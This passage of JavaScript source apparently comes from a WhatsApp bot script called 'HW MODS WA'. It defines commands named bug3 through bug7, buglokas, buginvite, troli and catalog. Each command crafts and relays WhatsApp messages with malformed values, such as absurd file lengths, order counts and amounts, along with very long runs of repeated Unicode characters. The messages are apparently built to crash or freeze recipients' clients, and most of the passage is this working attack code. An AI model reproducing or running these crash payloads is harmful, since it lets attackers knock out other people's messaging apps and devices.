					"url": "https://mmg.whatsapp.net/d/f/At7VrBdObWZY2de3bkRQHv71QT-OG1JpEu0ET91LvXf6.enc",
					"mimetype": "image/jpeg",
					"caption": "Done",
					"fileSha256": "5QgkzgrGdeS9fp4ZTKh6wAgUA66m6DT3FldlcSunWfU=",
					"fileLength": "161349999999999",
					"caption": `[⫹⫺ - 㑒 ❝𝗛𝗪 - 𝗠𝗢𝗗𝗦❞ - ★ 𝗪𝗔 ★ ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦`,
					"height": 720,
					"width": 403,
					"mediaKey": "0WVIR9TC1RBQZ+hNZWUyayLzDHZ6FxJ3qlA77mS2IQM=",
					"fileEncSha256": "k6Aa66tGP2Vg3LS2R/bLIABBl/G2cIDgP6pdCw6sdRA=",
					"directPath": "/v/t62.7118-24/30927240_463639825803537_6955387786401142368_n.enc?ccb=11-4&oh=01_AVzwXBCI5iAFsXIfUnqLVYS96346tBWyTvoDmf9bK542GA&oe=63510937",
					"mediaKeyTimestamp": "16636898529999",
					"jpegThumbnail": virgam
	}
	},
	{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
	}, contextInfo:{}}) 
	haikal.relayMessage(m.chat, image.message, { messageId: image.key.id})
}
break
//=================================================//
case 'bug3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© HW MODS WA${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case 'bug4': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© HW MODS WA`,
"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
"description": "Undangan Grup WhatsApp",
"title": `© HW MODS WA${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case 'bug5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
break
//=================================================//
case 'bug6': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/c/6285714170944",
"matchedText": "https://wa.me/c/6285714170944",
"description": "Developer HW MODS WA\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `© HW MODS WA${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case 'bug7': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© HW MODS WA${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:Haikal\nitem1.TEL;waid=6285714170944:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMACAYGBwYFCAcHBwkJCAoMFA0MCwsMGRITDxQdGh8eHRocHCAkLicgIiwjHBwoNyksMDE0NDQfJzk9ODI8LjM0Mv/bAEMBCQkJDAsMGA0NGDIhHCEyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMv/AABEIAGAAYAMBIgACEQEDEQH/xAAcAAACAwEAAwAAAAAAAAAAAAAFBgMEBwIAAQj/xAAzEAACAQMDAwIDBwQDAQAAAAABAgMABBEFEiEGMUETUSJhgQcyUnGRocEUQrHwFXLRI//EABkBAAIDAQAAAAAAAAAAAAAAAAECAAMEBf/EACARAAICAgMBAQEBAAAAAAAAAAABAhEDIRIxQQRhIkL/2gAMAwEAAhEDEQA/AM9O1rrbGD6UR2rnzz3q6dQS0UYO5lwf0PmqD/8AxB+Hmg17ekMVVst7+1Y+DySOhzWONhO61h1ZfjJYFgu3uwbxUcVvfXKgliqBdo8nb7GqmlWxllWWQbjnPPk0+aVboFUsBxzVvGMdIr5ynt9C/b9MXM0W6QysSuOTj8qtv0dOyepGhUAB87ueDz+1O0dzEi4yB/7VpLxGRVBGACPp3qWShSt/s6up2b022gJkfEfPio7/AKB1awVngdmK+Ac8Af4rRrDUQqLk4JAz+lETepKOcGi6oitMw+HXtU0iYC5ZwA2SG5BP8U/6B1PDfKvZX/uXPb/c1Y6m6Ug1exkliRVl2nx3rHrS8udE1NkOQYnKlTVUsEZq49lkc8oOpbR9H2zhosg5BORU9LHRmrjUtOyTyo7E5xTMTW35pXiSfmjnfVGsrr3Z89dQuIr66VAFCysAPYbjSqd0svuzGm/ruxk03qC9gcEBpCyH8Sscg/v+1LumW7XF/GgHAO4/ICqoRpF2SVtIY9OgEcagDsAKPQTGNQBQZrlLVgm0s2OceK8XVdzbVib6mkpvZZGSQeM5ZQc8ipobk7lGeGIFBYLh3+J0IHtV9ASvHfuD86UsTsZoJPgGD+tFbVl2h3kVR5yaS5bmZol9NyoA5qpEbm4uVQSsxz+dMC2atbTQSExiRWzwOeKxn7R9I/4/qZpVXEVwoYY9+x/xWk6RBGsarLJlhzw3NUvtF0dbzpZr1fjktSG3eduef80YumJNNx2DvsoWVrW7chvTXCgnsT3rRmbarE+Bmkr7OrlRoEdrtUMi71ZRjcrHz8wQR+lN8rZjYZ5PFasUaiYssuUgD1v0xZ9Q6eHkf0rmEZSYDPw98MPIzWQ9NW/pX14kikPF8JBGCCCQf8Vv0qCVWR+3HasTS0lsupb15QQJpnRs/i4b98mlyrVobFK3TJGt4YNzuAckszNQufXLKOQoFZseVXii9/ZtdQlA7Kp7geaCXWgyXCRgbYyg27h2I/KqIpPs1Pl/kI2moRzIJI23KfBGCKNW59XAUZJ7AUHsNN2mNBlgiFM+DznJ9zmm/pywVrtEfxStK9Dq/QVqEE0MaqEOWOKSNTvr/wDqjDG8scRbaqxHlsHBzjuc+K3/AFPQ4ZYGQqM44OKSZtCu4bwtG+4E+VGRRi0nskouSq6KnT/SeqMbVoL/ANItGrusy7treQCOa0DW7JoujdRt52DH+kk3NjuQpP8AFQaDavaoGlbkdhV3qGb19Du4u++Mpj/tx/NRtOWg1URJ+z1DFpUbt97G0j25/wB/WnZ2zge7ClnQIBbRPGo2qrYA8dhTBuy6/U1rj0c6W2Xn4dgP7vNIl1pK3t9qceCHcrPC3sy5A/gfWtLubVDDJIq7WVS3yNIt7qVjp15A00qs7owKp8TZ74+XejKq2LjbbuIoE4xuUqfKkYIPtUsVss5GMmutVvIr6+kuYUaNXIJVjk58n61xaXBjbFYpaejpw2rLbwpawkgAY5q707cYvix+EYyM+RVG+nElq2CMmhJv7lLmIKFWJV2k5Ib6eKAapm1llvLYCNhuI7ml8XCi5ZJVCupwQaSbPV9Vu7qGO0vHiCsA2VByPn7CmHUZvSkWVpN0h+83bJqBpIZUnh28KBQHqvV4NN0xJpg5RplXCDJ7E9vpVaLUcqMN3pf6yuf6mK2td2fiMjD28D+akXuyTj/LCehdQ6Tcq6x30SyMxISRtrEceDTMjhmyDkbeDWLPpCSxrgbiRk5FSQNquj82Oo3ELfgRtyn6HitMcq9MTwvtG09a9QPFozQWMbCOYmMz+O3IHzrJLm5jEMRLZdQGAXv25rZtU02PWelZrGMbSY90ZXjDDkf786xWysXmlMWwqVJViR93B80mVNyQMHFRf4T2LT3bM5CxxL3Hck1cTvXqVBaosEZC7clSf7h7H5/xVUTurAhePIPmq5RpF0MtP8Lc7FYicE45oLcXjB9oRx8yOKLC4juAY8lZAM7W4OPce4/KuPSQHlQfzFL0XKSbs503VLtQEs7RWkbIckY/KrUp1QSK14Aqk/dHirulxW0cocuwc+BwKNGyl1K4jtoV3yOcAAcAe5+VRbHnKPaVAaK6EMe4ngUFuJHvbhp3bhuF/Ktgk6EsJdBOmhCtw2HN2y4Yt7Y8L4xWUXNhNbXsltOm14WKOvgEHFNKDj2UxyrJqPhEAANkY/M+K9D0o3+I7mPnFdSOqDaoGaqbyWOOT+KgFmwdM6tHcaRHOXAQLuJJ7ACka8eBtWunhj9OKdzKvPPz/wDfrXOmR3GnWElgs7Pbs2VyMNj8J+teXNtI4wgyyncPzrTJuqZhSVtorvAk4IIxk/pXEdksTfGufZsUQgtpDGH2HB/arMcRwQRz86Sh0wVNp1tfLtk+8v3WU4ZT8jUTaffWq59NbmP3HDAfzTAIlByRwfNTRpxyc4pXGx4za6ANhbpcTBPSeNvwk8/pWodL2SWNiriMJM7Esx+8R4BP8UB06Met6hxkcZprsQzDI4jA4Pzp8cKdiZsrlHiEpztIYnIPNZN9o9utv1CtwpCi4gWR/wDsCVP64Fafcy5QckkVl32k75NZssn4f6YY+XxNRy9C/O3yElmaRuMgVLHHkH2Hc11HCWPHC+9ShVJ2g4UcVmbN8Y+n/9k=\nX-WA-BIZ-DESCRIPTION:Developer HW MODS WAWhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:Haikal\nEND:VCARD",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
//=================================================//
case 'lokas': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© HW MODS WA${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
case 'buglokas': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© HW MODS WA${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
break
//=================================================//
case 'buginvite': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME HW MODS WA${ngazap(prefix)}`,
"groupName": `MY NAME HW MODS WA${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
break
//=================================================//
case 'troli': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© HW MODS WA${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© HW MODS WA${ngazap(prefix)}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
//=================================================//
case 'catalog': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `[⫹⫺ - 㑒 ❝𝗛𝗪 - 𝗠𝗢𝗗𝗦❞ - ★ 𝗪𝗔 ★ ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦